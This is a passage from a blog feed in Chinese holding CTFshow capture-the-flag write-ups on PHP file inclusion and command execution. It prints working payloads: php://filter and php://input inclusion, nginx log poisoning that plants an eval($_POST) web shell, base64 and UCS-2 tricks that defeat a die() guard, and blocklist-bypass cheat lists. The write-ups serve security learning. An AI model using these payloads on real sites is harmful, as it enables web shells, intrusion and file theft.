alt=\"\"></p>\n<p>没有进行任何的过滤</p>\n<p>方法一：</p>\n<p>直接 php://fileter 伪协议读取</p>\n<p>poc：</p>\n<p><strong>?file=php://filter/convert.base64-encode/resource=flag.php</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/6TbW43HalPaNNrWv.png!thumbnail\" alt=\"\"></p>\n<p>复制下来 base64 解码得到 flag</p>\n<p>方法二：</p>\n<p>bp 抓包使用？file=php://input 然后接上命令</p>\n<p><strong>语句：</strong></p>\n<p><strong> <code>&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</code> </strong></p>\n<p>如图所示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yYRmA1Zn0B2HnGjG.png!thumbnail\" alt=\"\"></p>\n<p>获得 flag</p>\n<p><strong>ctfshow{c5e47e9f-a526-4103-8a32-cf582177a187}</strong></p>\n<h1 id=\"web79\"><a class=\"markdownIt-Anchor\" href=\"#web79\">#</a> <strong>WEB79</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hvOh32Pct6J2QoYE.png!thumbnail\" alt=\"\"></p>\n<p>先开环境看看代码</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ubm5wYy0xMzExNDQxMDQwLmNvcy5hcC1zaGFuZ2hhaS5teXFjbG91ZC5jb20vaHZPaDMyUGN0NkoyUW9ZRS5wbmchdGh1bWJuYWls\">https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hvOh32Pct6J2QoYE.png!thumbnail</span></p>\n<p>看到它把 php 给过滤了，而 str_replace 区分大小写</p>\n<p>这里涉及到一个知识点：</p>\n<blockquote>\n<p>str_replace 区分大小写，str_ireplace 不区分<br>\n因为这里是 str_replace，所以是区分大小写的，可以使用大小写变换来进行绕过</p>\n</blockquote>\n<p>配合使用 php://input</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1DBm1Mbj75E4Of7G.png!thumbnail\" alt=\"\"></p>\n<p><strong>?file=Php://input</strong></p>\n<p><strong> <code>&lt;? php system(&quot;ls&quot;); ?&gt;</code> </strong></p>\n<p>先使用命令看看都有什么文件，看到了 flag.php，直接进行读取</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MOuAMGKa6EDqUbAl.png!thumbnail\" alt=\"\"></p>\n<p><strong> <code>&lt;?php system(&quot;cat flag.php&quot;); ?&gt;</code> </strong></p>\n<p>得到 flag</p>\n<p 1654a8fe-95a8-423f-ada7-fc77cf4da835=\"\">ctfshow</p>\n<h1 id=\"web80\"><a class=\"markdownIt-Anchor\" href=\"#web80\">#</a> WEB80</h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/aWljdQvbT4e0Ymd2.png!thumbnail\" alt=\"\"></p>\n<p>看到把 php 和 data 都过滤了，因此 php 和 data 的伪协议都使用不了了</p>\n<p>但是依然还是 str_replace，区分大小写，还是可以使用大小写绕过的办法</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/59zcLGHaNtrQ6LxP.png!thumbnail\" alt=\"\"></p>\n<p>看到了 fl0g.php，直接 cat 进行读取</p>\n<p><strong> <code>&lt;?php system(&quot;cat fl0g.php&quot;); ?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Xc1WS1lhZHuFLhJT.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{0101a529-78eb-4693-b926-cbd85ec90ca7}</strong></p>\n<h1 id=\"web81\"><a class=\"markdownIt-Anchor\" href=\"#web81\">#</a> <strong>WEB81</strong></h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/sRlISoLFLXWMRxTd.png!thumbnail\" alt=\"\"></p>\n<p>在前两道题目的基础上过滤了 &quot;:&quot;，因此伪协议和大小写绕过都行不通了</p>\n<p>可以使用日志文件包含</p>\n<p>首先抓包修改 UA 头传入一句话木马</p>\n<p><strong> <code>&lt;?php @eval($_POST['a']);?&gt;</code> </strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/U9e6GtCr81gu6uWp.png!thumbnail\" alt=\"\"></p>\n<p>再通过 file 访问日志</p>\n<p><strong>?file=/var/log/nginx/access.log</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vw9begwVyd9D56gy.png!thumbnail\" alt=\"\"></p>\n<p>再通过命令执行测试后门</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/dMqqphy3FPxutnDq.png!thumbnail\" alt=\"\"></p>\n<p>成功，查看文件</p>\n<p><strong>a=system(“ls”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/JU1JMEAme2qIvYbg.png!thumbnail\" alt=\"\"></p>\n<p>获取 flag</p>\n<p><strong>a=system(“tac fl0g.php”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uxX07sSjpyq0ljTj.png!thumbnail\" alt=\"\"></p>\n<p>当使用命令 cat<br>\nfl0g.php 时，flag 不会被显示在 2 页面上，需要去页面的注释中查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bM8Z4ZfgGxCFj84r.png!thumbnail\" alt=\"\"></p>\n<p><strong>ctfshow{fa05c0f6-0d77-4782-8eaa-e5bd5285736d}</strong></p>\n<h1 id=\"web82\"><a class=\"markdownIt-Anchor\" href=\"#web82\">#</a> <strong>WEB82</strong></h1>\n<h1 id=\"web83\"><a class=\"markdownIt-Anchor\" href=\"#web83\">#</a> <strong>WEB83</strong></h1>\n<h1 id=\"web84\"><a class=\"markdownIt-Anchor\" href=\"#web84\">#</a> <strong>WEB84</strong></h1>\n<h1 id=\"web85\"><a class=\"markdownIt-Anchor\" href=\"#web85\">#</a> <strong>WEB85</strong></h1>\n<h1 id=\"web86\"><a class=\"markdownIt-Anchor\" href=\"#web86\">#</a> <strong>WEB86</strong></h1>\n<h1 id=\"web87\"><a class=\"markdownIt-Anchor\" href=\"#web87\">#</a> <strong>WEB87</strong></h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vk21SAptuNVjoivC.png!thumbnail\" alt=\"\"></p>\n<p>发现使用了 die，在开头就写入了 die，会直接导致代码结束执行</p>\n<p>因此需要想办法绕过 die，不然传上去的一句话不会被执行</p>\n<p>首先考虑下怎么样才能绕过 die，能想到的就是编码，而本题也没看到禁用任何的编码，因此直接使用最常规的的 base64，这里引用下<em> Monica</em> 师傅所解释的 base64 绕过方法：</p>\n<blockquote>\n<p>编码时，转换成 Base64 的最小单位就是 3 个字节<br>\n解码时，4 个字节为一组；PHP 在解码 base64 时，遇到不在其中的字符时，将会忽略这些字符，仅将合法字符组成一个新的字符串进行解码（Base64 的字符选用了 &quot;A-Z、a-z、0-9、+、/&quot;<br>\n64 个可打印字符）所以，通过 base64 解码过滤之后就只有 phpdie6<br>\n 个字符我们就要添加 2 个字符让 phpdie 和我们增加的两个字符组合起来进行解码。即可抹掉死亡函数。<br>\n总结起来就是：</p>\n</blockquote>\n<p>对已有的 php 语句，即： <code>&lt;?php die('大佬别秀了');?&gt;</code> ，进行 base64 解码时，其中的可打印字符只有 phpdie 这 6 个字符，我们知道只有 die 被解码了，才能成功绕过，而解码是为 4 个字节为一组，因此我们只要添加两个字符拼接上去，就为八个字符，正好两组，能够被成功解码，从而绕过 die</p>\n<p>而这里将 php 过滤了，因此需要进行 url 编码，并且进行两次 url 编码</p>\n<p>（因为 get 传参的时候会进行一次 urldecode，只进行一次编码的话，同样的一次解码就会使 php 同样被过滤掉）</p>\n<p><strong>?file=php://filter/write=convert.base64-decode/resource=1.php</strong></p>\n<p>进行两次 url 编码后：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%44%25%36%33%25%36%46%25%36%45%25%37%36%25%36%35%25%37%32%25%37%34%25%32%45%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%44%25%36%34%25%36%35%25%36%33%25%36%46%25%36%34%25%36%35%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%33%31%25%32%45%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>\n<p>post 传入一句话：<br>\n<strong> <code>&lt;?php eval($_POST[1]);?&gt;</code> </strong></p>\n<p>这里需要将该一句话进行 base64 编码并在前面加上两个字符用来解码的时候绕过 die</p>\n<p>PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+</p>\n<p>这里涉及到一个知识点，base64 之后末尾为 +，需要将 + 进行 urlencode</p>\n<p>还是引用刚才那个大师傅的解释：</p>\n<blockquote>\n<p>如果直接传入 content，这里的 + 会被当做空格处理，所以在 base64 解码的时候就会忽略空格，自动在后面加上一个 =：即 PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8=<br>\n 而加号被当成空格传入被加上 = 进行解码后的结果是：&lt;?php<br>\neval($_POST[1]);?</p>\n</blockquote>\n<p>并不是一个完整的一句话了，因此我们想要保留 + 的话就需要对其进行 url 编码</p>\n<p>（同时这里也可以换一个一句话，使其编码之后不带 +）</p>\n<p>最终的一句话：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">content=aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B</span><br></pre></td></tr></table></figure>\n<p>传入一句话如图所示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/qOBya9uN89lltL80.png!thumbnail\" alt=\"\"></p>\n<p>访问 1.php 然后进行命令执行获取 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UKfoSt3626AP9jKS.png!thumbnail\" alt=\"\"></p>\n<p>测试 phpinfo 成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4GrysQ0aVr6ajxrz.png!thumbnail\" alt=\"\"></p>\n<p><strong>1=system(“ls”);phpinfo();</strong></p>\n<p>找到目录下的文件，tac fl0g.php 获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/j4fH5XQL6rzYg2f3.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{d9f22b7f-b350-4e0e-acf1-18e9e27af3f0}</strong></p>\n<h1 id=\"web88\"><a class=\"markdownIt-Anchor\" href=\"#web88\">#</a> WEB88</h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/lmgVvcyhUZDD9i6Q.png!thumbnail\" alt=\"\"></p>\n<p>看到过滤了 php，但是没有过滤 data，因此使用 data 伪协议</p>\n<p>语句：</p>\n<p><strong>?file=data://text/plain;base64, <code>&lt;?php eval($_POST['ttxxxxx']);?&gt;</code> x</strong></p>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbJ3R0eHh4eHgnXSk7Pz54</span><br></pre></td></tr></table></figure>\n<p>后面加一个 x 是为了消除等号，但也可以直接把等号删除<br>\n但如果出现了 + 号，就需要换个一句话进行 base64encode</p>\n<p>传入 payload</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OvmizlWuUVNnusUe.png!thumbnail\" alt=\"\"></p>\n<p>测试 phpinfo 成功</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HLsNSa6EI77kIXQL.png!thumbnail\" alt=\"\"></p>\n<p>命令查看目录下文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TzlryihFnVCT9TeZ.png!thumbnail\" alt=\"\"></p>\n<p>查看 fl0g.php 获得 flag</p>\n<p><strong>ttxxxxx=system(“tac fl0g.php”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2f3jwWipdXoKUKct.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{8d138758-6761-4e74-a355-d204633d4bfb}</strong></p>\n<h1 id=\"web116\"><a class=\"markdownIt-Anchor\" href=\"#web116\">#</a> <strong>WEB116</strong></h1>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/HjBEQ5XLcxWcfMJY.png!thumbnail\" alt=\"\"></p>\n<p>提示是有 misc 成分在其中</p>\n<p>打开环境发现是一个视频</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/iLDrEOAKTQCpi4ak.png!thumbnail\" alt=\"\"></p>\n<p>右键保存下来，拖入 winhex 看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/418X0kDUvQZS6vsp.png!thumbnail\" alt=\"\"></p>\n<p>发现文件尾是以 png 的 16 进制结尾，因此把该 png 分离出来</p>\n<p>kali 中使用 foremost 或 binwalk 分离（也可以直接手动分离）</p>\n<p><strong>foremost 1.mp4</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/k0A9HquCF4UB0NhF.png!thumbnail\" alt=\"\"></p>\n<p>得到一个 output 文件夹</p>\n<p>拿到 png</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YqMCKq3paUDvQP2g.png!thumbnail\" alt=\"\"></p>\n<p>查看代码，发现禁用了一些编码和 data，但是没有禁用 php，直接 bp 抓包读取 flag.php</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wGVkrvMJ1wI8fLlb.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag，</p>\n<p><strong>ctfshow{81c35502-a3c5-4172-91cc-5640d84ce015}</strong></p>\n<h1 id=\"web117\"><a class=\"markdownIt-Anchor\" href=\"#web117\">#</a> WEB117</h1>\n<p>打开环境，查看代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/n7bf45TrXNy4Go78.png!thumbnail\" alt=\"\"></p>\n<p>发现 data 被禁用了，而 php 没有被禁用，但是有 die 函数，所以需要想办法绕过 die 函数</p>\n<p>和 WEB87 很相似，但是这里的 rot13 和 base64 都被禁用了，只能另寻编码使用</p>\n<p>这里就用到了 ucs-2 编码</p>\n<p>usc-2：</p>\n<p>会对目标字符串进行两位一反转</p>\n<p>（因此字符串中的字符数目得是偶数）</p>\n<p>pyload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=nnnpc.php</span><br></pre></td></tr></table></figure>\n<p>post 传参：<br>\n<strong>contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</strong></p>\n<blockquote>\n<p>本题原理就是传入先进行两位翻转好的一句话，拼接到死亡函数之后再因为 usc-2 再次进行两位翻转，一句话成功还原，而 die 函数被翻转过滤掉，反转后即：<br>\n?&lt;hp pid(e;)&gt;? <code>&lt;?php eval($_POST[1]);?&gt;</code></p>\n</blockquote>\n<p>然后访问 nnnpc.php 进行命令执行</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BM13OPRRJ6ji7r71.png!thumbnail\" alt=\"\"></p>\n<p>查看 phpinfo 成功，查看目录下的文件</p>\n<p><strong>1=system(“ls”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/fmM4wyKHzy4bR2Wn.png!thumbnail\" alt=\"\"></p>\n<p>查看 flag.php 获取 flag</p>\n<p><strong>1=system(“tac flag.php”);phpinfo();</strong></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/XhG2Ag0HC1VwZwyB.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{f57f34ae-acb2-48db-9e4f-71b53a8be8e2}</strong></p>\n",
            "tags": [
                "WEB"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "url": "https://nnnpc.github.io/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
            "title": "CTFshow命令执行",
            "date_published": "2024-04-16T05:58:18.974Z",
            "content_html": "<h1 id=\"web29\"><a class=\"markdownIt-Anchor\" href=\"#web29\">#</a> WEB29</h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 00:26:48</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现过滤了大小写的 flag<br>\n<strong>?c=system(“ls”);</strong></p>\n<p>先进行命令执行查看有什么文件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/zm6V8snCDL5v61b3.png!thumbnail\" alt=\"\"></p>\n<p>发现了 flag.php，进行查看该文件</p>\n<p>由于过滤了 flag 这个字符串，因此需要用？或者通配符 * 来进行代替</p>\n<p>或者也可以将 flag 进行隔断，这里有很多种姿势，可以都尝试下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=system(&quot;cat f*&quot;);</span><br><span class=\"line\">?c=system(&quot;cat fla&#x27;&#x27;g.php&quot;);</span><br><span class=\"line\">?c=system(&quot;cat fla?.php&quot;);</span><br></pre></td></tr></table></figure>\n<p>读取的话可以使用 cat、tac、nl 等</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=system(&quot;cat fla?.php&quot;);</span><br><span class=\"line\">?c=system(&quot;nl fla?.php&quot;);</span><br><span class=\"line\">?c=system(&quot;tac fla?.php&quot;);</span><br></pre></td></tr></table></figure>\n<p>不同是在 tac 和 nl 能直接把 flag 显示在页面上，而 cat 需要去注释中寻找<br>\n读取得到 flag</p>\n<p><strong>ctfshow{6c31e09f-272e-4f25-b30f-37ed59424304}</strong></p>\n<h1 id=\"web30\"><a class=\"markdownIt-Anchor\" href=\"#web30\">#</a> <strong>WEB30</strong></h1>\n<p>打开环境查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 00:42:26</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>发现除了 flag 被过滤了，还有 system 和 php 同样都被过滤了，既然 system 不能用了那就换成 passthru () 继续进行命令执行<br>\n关于 php 字符串的过滤，可以直接使用 f * 来代替 flag.php，或者截断，或者使用？来代替</p>\n<p>（同样的姿势来绕过，禁用了什么就用同样的姿势绕过什么）</p>\n<p>如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=passthru(&quot;tac f*&quot;);</span><br><span class=\"line\">?c=passthru(&quot;tac fla&#x27;&#x27;g.ph&#x27;&#x27;p&quot;);</span><br><span class=\"line\">?c=passthru(&quot;tac fla&#x27;&#x27;g.???&quot;);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2l2mDbc6VRWCJnu0.png!thumbnail\" alt=\"\"></p>\n<p>得到 flag</p>\n<p><strong>ctfshow{66e20265-d458-4936-896c-44916e273edb}</strong></p>\n<h1 id=\"web31\"><a class=\"markdownIt-Anchor\" href=\"#web31\">#</a> <strong>WEB31</strong></h1>\n<p>打开环境查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 00:49:10</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span class=\"line\">*/</span><br><span class=\"line\"></span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class=\"line\">    $c = $_GET[&#x27;c&#x27;];</span><br><span class=\"line\">    if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123;</span><br><span class=\"line\">        eval($c);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>在前一题的基础上过滤了 cat|sort|shell 这些字符串和点、空格、单引号，cat 很明显不能用了，但是 tac 和 nl 还是没有被过滤，因此绕过字符串过滤的方法还是和的前面的 pyload 一样，只不过需要绕过被过滤的空格，这里可以使用 %09 来代替空格进行绕过<br>\n？c=passthru (“tac%09f*”);</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">知识点：</span><br><span class=\"line\">绕过cat使用tac more less head tac tail nl od(二进制查看) vi vim sort uniq</span><br><span class=\"line\">绕过空格用%09 &lt;&gt; $&#123;IFS&#125; $IFS$9 &#123;cat,fl*&#125; %20</span><br></pre></td></tr></table></figure>\n<p>这里也列出其他师傅的 pyload 来参考学习</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=passthru(&quot;nl%09`ls`&quot;);//在注释中查看flag</span><br></pre></td></tr></table></figure>\n<p>本题开始也介绍一个很骚的姿势，用 include 进行包含，使用 php:filter 伪协议，payload 如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?c=include$_GET[&quot;nnnpc&quot;];&amp;nnnpc=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>由于 c 传参中没有被过滤的字符，而 nnnpc 中的 php:filter 伪协议并不是 c 直接传参进去，而是被 include 进行包含进去的，因此不会被过滤，使用该伪协议直接将 flag 进行了 base64 输出在 web 页面上<br>\n这里就展示一开始最简单的 %09 绕过空格的办法了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/A982XmrnNzFSWx7m.png!thumbnail\" alt=\"\"></p>\n<p>最终得到 flag</p>\n<p><strong>ctfshow{98c19e7b-17b8-4a44-bdd8-4837fe3b3a23}</strong></p>\n<h1 id=\"web32\"><a class=\"markdownIt-Anchor\" href=\"#web32\">#</a> <strong>WEB32</strong></h1>\n<p>打开环境，查看代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> &lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">/*</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Author: h1xa</span><br><span class=\"line\"># @Date:   2020-09-04 00:12:34</span><br><span class=\"line\"># @Last Modified by:   h1xa</span><br><span class=\"line\"># @Last Modified time: 2020-09-04 00:56:31</span><br><span class=\"line\"># @email: h1xa@ctfer.com</span><br><span class=\"line\"># @link: https://ctfer.com</span><br><span class=\"line\"></span><br><span 